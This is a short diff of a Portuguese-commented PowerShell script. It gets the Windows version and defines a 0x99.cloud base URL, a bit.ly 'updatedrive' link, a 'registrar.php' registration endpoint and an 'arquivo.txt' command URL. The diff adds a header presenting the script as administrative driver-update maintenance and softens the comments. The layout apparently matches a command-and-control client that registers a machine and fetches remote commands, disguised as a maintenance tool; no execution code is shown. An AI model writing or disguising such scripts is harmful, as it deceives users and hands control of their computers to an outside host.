@@ -1,3 +1,6 @@
+# Script de manutenção administrativa para atualizar drivers pela nuvem
+# v0.1b, em desenvolvimento
+
 # Função para obter a versão do Windows
 function Get-WindowsVersion {
     $os = Get-WmiObject -Class Win32_OperatingSystem
@@ -8,10 +11,10 @@ function Get-WindowsVersion {
 # Chama a função para obter a versão do Windows
 $windowsVersion = Get-WindowsVersion
 
-# Define o endereço do site
+# Define o endereço da nuvem
 $siteUrl = "https://www.0x99.cloud"
 
-# Constrói os URLs usando a variável $siteUrl
+# URLs
 $updateUrl = "https://bit.ly/updatedrive"
 $registerUrl = "$siteUrl/registrar.php"
 $commandUrl = "$siteUrl/arquivo.txt"
